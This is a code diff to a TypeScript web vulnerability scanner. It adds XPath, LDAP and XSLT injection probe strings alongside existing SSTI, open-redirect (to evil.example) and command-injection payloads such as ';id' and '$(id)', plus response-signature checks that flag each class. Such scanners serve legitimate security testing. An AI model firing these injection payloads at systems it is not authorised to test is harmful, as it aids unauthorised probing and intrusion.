@@ -16,6 +16,10 @@ export const PAYLOADS: Record<string, string[]> = {
   ssti: ["{{7*7}}", "${7*7}", "#{7*7}", "{{7*'7'}}", "<%= 7*7 %>"],
   redirect: ["https://evil.example/", "//evil.example/", "https://evil.example", "/\\evil.example", "//evil.example/%2f.."],
   cmdi: [";id", "|id", "`id`", "$(id)", "%0aid"],
+  // XPath / LDAP / XSLT injection (2026-09-24): error-shape + boolean/eval signals.
+  xpath: ["' or '1'='1", "' or count(/)='1", "']|//user/*['", "1 or 1=1", "'%20or%20'1'='1"],
+  ldap: ["*)(uid=*))(|(uid=*", "*()&|", "*)(objectClass=*", "*)(cn=*)"],
+  xslt: ["<?xml version=\"1.0\"?><xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\"><xsl:template match=\"/\"><xsl:value-of select=\"7*7\"/></xsl:template></xsl:stylesheet>"],
 };
 
 const SQL_ERR = /(SQL syntax|SQLite|sqlite3|mysql_|You have an error in your SQL|ORA-\d{4,}|PostgreSQL.*ERROR|unclosed quotation mark|syntax error at or near|SequelizeDatabaseError|pg::SyntaxError)/i;
@@ -64,6 +68,9 @@ export function classify(payload: string, klass: string, r: Probe, base: Probe):
   if (reflected && klass === "xss") out.push("reflection (cek XSS konteks)");
   if ((klass === "sqli" || klass === "xss") && SQL_ERR.test(r.body) && !SQL_ERR.test(base.body)) out.push("SQL error signature");
   if (klass === "ssti" && /\b49\b/.test(r.body) && !/\b49\b/.test(base.body)) out.push("SSTI eval (7*7=49)");
+  if (klass === "xpath" && /(XPathException|xmlXPath|XQuery|xpath.*error|Invalid predicate|libxml)/i.test(r.body) && !/(XPathException|xmlXPath|XQuery|xpath.*error|Invalid predicate|libxml)/i.test(base.body)) out.push("XPath error signature");
+  if (klass === "ldap" && /\((uid|cn|objectClass)=/i.test(r.body) && !/\((uid|cn|objectClass)=/i.test(base.body)) out.push("LDAP filter reflection/echo");
+  if (klass === "xslt" && /\b49\b/.test(r.body) && !/\b49\b/.test(base.body)) out.push("XSLT eval (7*7=49)");
   if (klass === "redirect" && r.status >= 300 && r.status < 400 && /(evil\.example|^\/\\|\/\/(evil\.example))/i.test(r.loc)) out.push(`open redirect -> ${r.loc.slice(0, 80)}`);
   if (klass === "cmdi" && /uid=\d+.*gid=\d+/i.test(r.body) && !/uid=\d+.*gid=\d+/i.test(base.body)) out.push("command output (uid=)");
   if (r.ms - base.ms > 4000) out.push(`timing +${r.ms - base.ms}ms`);
